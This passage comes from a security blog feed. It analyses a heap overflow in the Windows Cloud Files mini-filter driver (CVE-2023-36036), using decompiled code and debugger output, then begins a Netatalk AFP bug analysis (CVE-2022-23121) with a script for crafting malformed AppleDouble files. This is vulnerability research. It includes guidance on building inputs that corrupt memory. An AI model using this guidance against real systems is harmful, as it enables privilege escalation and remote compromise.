&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)Length &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (v22 &lt;span style="color:#f92672">=&lt;/span> a1&lt;span style="color:#f92672">-&amp;gt;&lt;/span>FileData.ElementInfos[&lt;span style="color:#ae81ff">1&lt;/span>].Type, v22 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x12u&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> ((v23 &lt;span style="color:#f92672">=&lt;/span> a1&lt;span style="color:#f92672">-&amp;gt;&lt;/span>FileData.ElementInfos[&lt;span style="color:#ae81ff">1&lt;/span>].Offset, &lt;span style="color:#f92672">!&lt;/span>(_DWORD)v23) &lt;span style="color:#f92672">||&lt;/span> v23 &lt;span style="color:#f92672">&amp;gt;=&lt;/span> hsm_data_length)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v23 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)Length
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (v24 &lt;span style="color:#f92672">=&lt;/span> a1&lt;span style="color:#f92672">-&amp;gt;&lt;/span>FileData.ElementInfos[&lt;span style="color:#ae81ff">1&lt;/span>].Length, v24 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)Length)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v24 &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v23 &lt;span style="color:#f92672">&amp;gt;=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v23
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v24 &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v23 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)Length
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v22 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v24 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> element_1_Data &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(ULONG &lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>p_FileData&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Magic &lt;span style="color:#f92672">+&lt;/span> v23);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> IsReparseBufferSupported &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> IsReparseBufferSupported &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xC0000225&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">HsmDbgBreakOnStatus&lt;/span>(IsReparseBufferSupported);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (IsReparseBufferSupported &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0x80000000&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v25 &lt;span style="color:#f92672">=&lt;/span> WPP_GLOBAL_Control;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( WPP_GLOBAL_Control &lt;span style="color:#f92672">==&lt;/span> (PDEVICE_OBJECT)&lt;span style="color:#f92672">&amp;amp;&lt;/span>WPP_GLOBAL_Control
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> (&lt;span style="color:#a6e22e">HIDWORD&lt;/span>(WPP_GLOBAL_Control&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Timer) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#a6e22e">BYTE1&lt;/span>(WPP_GLOBAL_Control&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Timer) &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2u&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> IsReparseBufferSupported;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v26 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">24&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_163;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (element_1_Data &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> IsReparseBufferSupported;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>通过构造&lt;code>ElementInfos[0]&lt;/code>和&lt;code>ElementInfos[1]&lt;/code>可以通过&lt;code>HsmpRpValidateBuffer&lt;/code>校验，而后漏洞触发点会读取&lt;code>ElementInfos[10]&lt;/code>的数据和Length通过memcpy进行拷贝，所以还需要构造&lt;code>ElementInfos[10]&lt;/code>的数据，并且&lt;code>ElementInfos[10]&lt;/code>的Length需要超过目标缓冲区，特别的在计算CRC32后，需要通过RtlCompressBuffer压缩目标数据，并放入到FileData处。&lt;/p>
&lt;p>构造多大的缓冲区？根据前面补丁分析，在补丁中限制了ReparseDataLength &amp;lt; 0x4000，所以超过四千的部分会造成溢出，如果想溢出8个字节则需要构造0x4008 + 8 = 0x4010，依此类推，在构造缓冲区时。&lt;/p>
&lt;p>如何将构造好的数据传递给驱动并在目标位置触发呢？在网上查到有类似漏洞分析文章
&lt;a href="https://zhuanlan.zhihu.com/p/392194464" target="_blank">Windows云文件迷你过滤器驱动程序中的提权漏洞(CVE-2021-31969)&lt;/a>，不难看出CVE-2021-31969修复和本次分析的漏洞CVE-2023-36036修复位置类似，都对ReparseDataLength进行了判断，所以本次PoC编写也可以借鉴。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36036-Windows-Cloud-Files-Mini-Filter-Driver-Eop.zh-cn.assets/4.png" />&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36036-Windows-Cloud-Files-Mini-Filter-Driver-Eop.zh-cn.assets/5.png" />&lt;/p>
&lt;p>在CVE-2021-31969分析文章中贴出了部分PoC，结合这部分PoC和前面的结构体，写出PoC也就不难了。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36036-Windows-Cloud-Files-Mini-Filter-Driver-Eop.zh-cn.assets/6.png" />&lt;/p>
&lt;p>&lt;strong>动态调试&lt;/strong>&lt;/p>
&lt;p>在如下两个位置下断点&lt;/p>
&lt;pre tabindex="0">&lt;code>bp cldflt!HsmpRpCommitNoLock
bp cldflt!HsmpRpCommitNoLock+0x13de
&lt;/code>&lt;/pre>&lt;p>运行poc，可以看到已经进入&lt;code>HsmpRpCommitNoLock&lt;/code>函数&lt;/p>
&lt;pre tabindex="0">&lt;code>1: kd&amp;gt; g
Breakpoint 0 hit
cldflt!HsmpRpCommitNoLock:
fffff804`6f6a1e88 48895c2420 mov qword ptr [rsp+20h],rbx
&lt;/code>&lt;/pre>&lt;p>继续运行，触发第二个断点&lt;/p>
&lt;pre tabindex="0">&lt;code>0: kd&amp;gt; g
Breakpoint 1 hit
cldflt!HsmpRpCommitNoLock+0x13de:
fffff804`6f6a3266 e81571faff call cldflt!memcpy (fffff804`6f64a380)
&lt;/code>&lt;/pre>&lt;p>此时memmove已经被优化为memcpy，而要拷贝的长度为0x3f94，dst所在的堆大小为0x4000，dst指向偏移0x74处，最多有0x3f8c大小，所以memcpy拷贝时会越界写入8个字节，造成堆溢出。&lt;/p>
&lt;pre tabindex="0">&lt;code>1: kd&amp;gt; rr8
r8=0000000000003f94
1: kd&amp;gt; !pool rcx
Pool page ffffd980717f7074 region is Paged pool
*ffffd980717f7000 : large page allocation, tag is HsRp, size is 0x4000 bytes
Owning component : Unknown (update pooltag.txt)
&lt;/code>&lt;/pre>&lt;p>继续运行，则在memcpy内部触发异常，因为尝试往未分配的内存里面写入00&lt;/p>
&lt;pre tabindex="0">&lt;code>0: kd&amp;gt; u
cldflt!memcpy+0x165:
fffff800`8186a4e5 0f2941f0 movaps xmmword ptr [rcx-10h],xmm0
0: kd&amp;gt; !pool rcx - 0x10
Pool page ffffe5028e4fa000 region is Paged pool
ffffe5028e4fa000 is not a valid large pool allocation, checking large session pool...
ffffe5028e4fa000 is not valid pool. Checking for freed (or corrupt) pool
Address ffffe5028e4fa000 could not be read. It may be a freed, invalid or paged out page
0: kd&amp;gt; rxmm0
mm0=0000000000000000
&lt;/code>&lt;/pre>&lt;p>对应代码为&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v25 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_OWORD &lt;span style="color:#f92672">*&lt;/span>)(v15 &lt;span style="color:#f92672">+&lt;/span> v25 &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_OWORD &lt;span style="color:#f92672">*&lt;/span>)(v15 &lt;span style="color:#f92672">+&lt;/span> v25 &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span> &lt;span style="color:#f92672">+&lt;/span> v13);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">__m128&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(v15 &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> v14;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>以下为调用栈&lt;/p>
&lt;pre tabindex="0">&lt;code>1: kd&amp;gt; k
# Child-SP RetAddr Call Site
00 fffffb8a`8a45e4f8 fffff804`63717f82 nt!DbgBreakPointWithStatus
01 fffffb8a`8a45e500 fffff804`63717566 nt!KiBugCheckDebugBreak+0x12
02 fffffb8a`8a45e560 fffff804`635fd747 nt!KeBugCheck2+0x946
03 fffffb8a`8a45ec70 fffff804`63638f6f nt!KeBugCheckEx+0x107
04 fffffb8a`8a45ecb0 fffff804`63430730 nt!MiSystemFault+0x1de5ff
05 fffffb8a`8a45edb0 fffff804`6360d1d8 nt!MmAccessFault+0x400
06 fffffb8a`8a45ef50 fffff804`6f64a4e1 nt!KiPageFault+0x358
07 fffffb8a`8a45f0e8 fffff804`6f6a326b cldflt!memcpy+0x161
08 fffffb8a`8a45f0f0 fffff804`6f6a983b cldflt!HsmpRpCommitNoLock+0x13e3
09 fffffb8a`8a45f230 fffff804`6f66f0d7 cldflt!HsmiOpUpdatePlaceholderDirectory+0x57f
0a fffffb8a`8a45f320 fffff804`6f674b65 cldflt!HsmFltProcessUpdatePlaceholder+0x443
0b fffffb8a`8a45f3d0 fffff804`6f6a4504 cldflt!HsmFltProcessHSMControl+0x3d5
0c fffffb8a`8a45f500 fffff804`647264cc cldflt!HsmFltPreFILE_SYSTEM_CONTROL+0x6a4
0d fffffb8a`8a45f5a0 fffff804`64725f7a FLTMGR!FltpPerformPreCallbacksWorker+0x36c
0e fffffb8a`8a45f6c0 fffff804`64725021 FLTMGR!FltpPassThroughInternal+0xca
0f fffffb8a`8a45f710 fffff804`6475ae2f FLTMGR!FltpPassThrough+0x541
10 fffffb8a`8a45f7a0 fffff804`63410665 FLTMGR!FltpFsControl+0xbf
11 fffffb8a`8a45f800 fffff804`6380142c nt!IofCallDriver+0x55
12 fffffb8a`8a45f840 fffff804`63801081 nt!IopSynchronousServiceTail+0x34c
13 fffffb8a`8a45f8e0 fffff804`638d9ed6 nt!IopXxxControlFile+0xc71
14 fffffb8a`8a45fa20 fffff804`63610ef5 nt!NtFsControlFile+0x56
15 fffffb8a`8a45fa90 00007ff9`c648d704 nt!KiSystemServiceCopyEnd+0x25
16 00000056`01aff5b8 00007ff6`5e59167f ntdll!NtFsControlFile+0x14
17 00000056`01aff5c0 00000000`000001bc 0x00007ff6`5e59167f
18 00000056`01aff5c8 00000000`00000000 0x1bc
&lt;/code>&lt;/pre>&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36036-Windows-Cloud-Files-Mini-Filter-Driver-Eop.zh-cn.assets/3.png" />&lt;/p>
&lt;p>PoC会在过几天上传到GitHub&lt;/p>
&lt;pre tabindex="0">&lt;code>https://github.com/Chestnuts4/POC
&lt;/code>&lt;/pre>&lt;h3 id="小结">小结&lt;/h3>
&lt;p>本次漏洞分析离不开业内前辈逆向得出的_HSM_REPARSE_DATA结构体信息，这个结构体微软没有公开的文档，相关资料也很少。可以看到早在2018年，就已经逆向出了HSM相关数据结构信息。目前只有这一个仓库有相关信息，向前辈致敬。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/*****************************************************************************/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/* ReparseDataHsm.h Copyright (c) Ladislav Zezula 2018 */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/*---------------------------------------------------------------------------*/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/* Interface of the HSM reparse data structures */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/*---------------------------------------------------------------------------*/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/* Date Ver Who Comment */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/* -------- ---- --- ------- */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/* 06.09.18 1.00 Lad The first version of ReparseDataHsm.h */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/*****************************************************************************/&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36036-Windows-Cloud-Files-Mini-Filter-Driver-Eop.zh-cn.assets/7.png" />&lt;/p>
&lt;p>这里引用一下前辈的主页。&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://www.zezula.net/en/tools/main.html" target="_blank">https://www.zezula.net/en/tools/main.html&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>整体来看，这个漏洞原理和触发方式较为简单，在使用memcpy之前没有校验长度，而修复也简单，再解压之前验证长度是否超过0x4000，超过则认为数据有错，进入到错误逻辑，从而在源头阻止了触发漏洞逻辑。&lt;/p>
&lt;p>在漏洞修复处在修复上个整数下溢的漏洞时，开发人员只修复当时的整数下溢漏洞，没有去考虑长度会不会过长，某些程度来说这也是开发的粗心大意导致了这个漏洞留到现在。&lt;/p>
&lt;p>在编写PoC参考了其他安全研究员已有的分析。&lt;/p>
&lt;p>至于Exploit部分还得再研究一下。&lt;/p>
&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36036" target="_blank">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36036&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://zhuanlan.zhihu.com/p/392194464" target="_blank">https://zhuanlan.zhihu.com/p/392194464&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://github.com/microsoft/Windows-classic-samples/tree/main/Samples/CloudMirror" target="_blank">https://github.com/microsoft/Windows-classic-samples/tree/main/Samples/CloudMirror&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://learn.microsoft.com/en-us/windows/win32/cfapi/cloud-filter-reference" target="_blank">https://learn.microsoft.com/en-us/windows/win32/cfapi/cloud-filter-reference&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://learn.microsoft.com/zh-cn/windows/win32/cfapi/cloud-files-functions" target="_blank">https://learn.microsoft.com/zh-cn/windows/win32/cfapi/cloud-files-functions&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://learn.microsoft.com/en-us/windows/win32/api/_cloudapi/" target="_blank">https://learn.microsoft.com/en-us/windows/win32/api/_cloudapi/&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-11-24T15:49:32+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2022-23121 AFP RCE 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2022-23121-afp-rce/</link><pubDate>Thu, 23 Nov 2023 10:46:28 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2022-23121-afp-rce/</guid><description>&lt;h3 id="netatalk介绍">Netatalk介绍&lt;/h3>
&lt;p>
&lt;a href="http://netatalk.sourceforge.net/" target="_blank">Netatalk&lt;/a> 是一个 &lt;code>Apple Filing Protocol (AFP)&lt;/code> 的开源实现。它为 Unix 风格系统提供了与 Macintosh 文件共享的功能。多款NAS产品均有集成该功能。&lt;/p>
&lt;h3 id="漏洞简介">漏洞简介&lt;/h3>
&lt;p>Netatalk在处理&lt;code>FPOpenFork&lt;/code>命令的时候，由于未检查AppleDouble文件头中的偏移是否超出范围，导致攻击者可以通过控制AppleDouble文件的某些偏移，在内存中进行越界读写，通过该漏洞攻击者可以以启动Netatalk的用户权限执行任意命令&lt;/p>
&lt;h3 id="appledouble文件">Appledouble文件&lt;/h3>
&lt;p>Appledouble文件格式文档可在下面链接下载，AppleDouble文件是mac上一种存储数据的格式，AppleDouble文件可分为文件头和数据部分，文件头格式如下，对于每个Entry来说，数据在文件内的范围可表示为：&lt;code>[offset:offset+length]&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-text" data-lang="text">&lt;span style="display:flex;">&lt;span>Field Length
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Magic number 4 bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Version number 4 bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Filler 16 bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Number of entries 2 bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Entry descriptor for each entry:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Entry ID 4 bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Offset 4 bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Length 4 bytes
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>以下是一个有效的Appledouble文件，包含两个entry&lt;/p>
&lt;p>entry 1&lt;/p>
&lt;ul>
&lt;li>entry ID：0x09&lt;/li>
&lt;li>offset：0x32&lt;/li>
&lt;li>length：0x71&lt;/li>
&lt;/ul>
&lt;p>entry 2&lt;/p>
&lt;ul>
&lt;li>entry ID：0x02&lt;/li>
&lt;li>offset：0xA3&lt;/li>
&lt;li>length：0x46&lt;/li>
&lt;/ul>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/1.png" />&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://web.archive.org/web/20180311140826if_/http://kaiser-edv.de/documents/AppleSingle_AppleDouble.pdf" target="_blank">https://web.archive.org/web/20180311140826if_/http://kaiser-edv.de/documents/AppleSingle_AppleDouble.pdf&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;h3 id="如何生成有效的appledouble文件触发漏洞">如何生成有效的&lt;strong>AppleDouble文件触发漏洞&lt;/strong>&lt;/h3>
&lt;p>在
&lt;a href="https://nosec.org/home/detail/4997.html" target="_blank">https://nosec.org/home/detail/4997.html&lt;/a> 中keeee师傅分享了如何通过xattr库生成appledouble文件，这里为了方便生成所需文件对keeee师傅的方法进行魔改。&lt;/p>
&lt;p>首先安装 xattr-file和minimist库：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>npm install xattr-file
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>npm install minimist
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在node_modules目录内找到xattr-file.js文件，修改creat方法，为其添加接受各种偏移的接口，大致如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-jsx" data-lang="jsx">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">create&lt;/span>(&lt;span style="color:#a6e22e">attrs&lt;/span>, &lt;span style="color:#a6e22e">resoLength&lt;/span>, &lt;span style="color:#a6e22e">findoff&lt;/span>, &lt;span style="color:#a6e22e">findlen&lt;/span>, &lt;span style="color:#a6e22e">forkoff&lt;/span>, &lt;span style="color:#a6e22e">forklen&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">finderInfoOffset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">findoff&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#a6e22e">applLength&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">findoff&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">finderInfoLength&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">findlen&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">?&lt;/span> (&lt;span style="color:#a6e22e">attrLength&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">keysLength&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">dataLength&lt;/span>) &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">findlen&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">resourceForkOffset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">forkoff&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#a6e22e">fileLength&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">forkoff&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">resourceForkLength&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">forklen&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#a6e22e">resoLength&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">forklen&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>生成xattr文件的nodejs脚本：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-jsx" data-lang="jsx">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">xattr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">require&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;xattr-file&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">args&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">require&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;minimist&amp;#39;&lt;/span>)(&lt;span style="color:#a6e22e">process&lt;/span>.&lt;span style="color:#a6e22e">argv&lt;/span>.&lt;span style="color:#a6e22e">slice&lt;/span>(&lt;span style="color:#ae81ff">2&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">require&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;fs&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
